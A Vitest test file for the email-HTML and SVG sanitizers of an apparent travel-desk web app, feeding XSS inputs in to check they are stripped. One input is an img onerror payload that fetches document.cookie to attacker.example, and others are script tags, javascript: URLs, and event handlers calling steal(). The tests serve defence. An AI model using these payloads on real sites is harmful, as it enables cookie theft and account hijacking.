// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { sanitizeEmailHtml, sanitizeSvg } from '../utils/sanitizeHtml';

describe('sanitizeEmailHtml', () => {
  it('strips the img/onerror payload an injected queue row would carry', () => {
    const out = sanitizeEmailHtml('<img src=x onerror="fetch(\'https://attacker.example/\'+document.cookie)">');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('attacker.example');
  });

  it('removes script tags', () => {
    const out = sanitizeEmailHtml('<p>Hi</p><script>alert(document.cookie)</script>');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('alert(');
    expect(out).toContain('Hi');
  });

  it('removes iframes, objects and forms', () => {
    const out = sanitizeEmailHtml('<iframe src="https://evil"></iframe><object data="x"></object><form action="https://evil"><input name="pw"></form>');
    expect(out).not.toMatch(/<(iframe|object|form|input)/);
  });

  it('strips javascript: URLs but keeps real links', () => {
    expect(sanitizeEmailHtml('<a href="javascript:alert(1)">x</a>')).not.toContain('javascript:');
    expect(sanitizeEmailHtml('<a href="https://ng-travel-desk.vercel.app/req/1">View</a>'))
      .toContain('https://ng-travel-desk.vercel.app/req/1');
  });

  it('strips inline event handlers from otherwise allowed tags', () => {
    const out = sanitizeEmailHtml('<div onclick="steal()" onmouseover="steal()">text</div>');
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('onmouseover');
    expect(out).toContain('text');
  });

  it('preserves the markup a real travel-desk email uses', () => {
    const body = `<div style="font-family:Arial"><h2>Your request is confirmed</h2>` +
      `<table border="1" cellpadding="4"><tr><td align="left">Delhi</td><td>Pune</td></tr></table>` +
      `<p><strong>PNR</strong>: <em>IND-88219</em></p>` +
      `<a href="https://ng-travel-desk.vercel.app" target="_blank">Open portal</a>` +
      `<img src="https://ng-travel-desk.vercel.app/logo.png" alt="NavGurukul" width="200" /></div>`;
    const out = sanitizeEmailHtml(body);
    expect(out).toContain('<h2>');
    expect(out).toContain('<table');
    expect(out).toContain('<strong>');
    expect(out).toContain('target="_blank"');
    expect(out).toContain('alt="NavGurukul"');
    expect(out).toContain('font-family');
  });

  it('returns an empty string for empty input rather than throwing', () => {
    expect(sanitizeEmailHtml(null)).toBe('');
    expect(sanitizeEmailHtml(undefined)).toBe('');
    expect(sanitizeEmailHtml('')).toBe('');
  });
});

describe('sanitizeSvg', () => {
  it('keeps diagram markup but drops script', () => {
    const out = sanitizeSvg('<svg><g><rect width="10" height="10"/></g><script>alert(1)</script></svg>');
    expect(out).toContain('<rect');
    expect(out).not.toContain('<script');
  });

  it('returns an empty string for empty input', () => {
    expect(sanitizeSvg(null)).toBe('');
  });
});
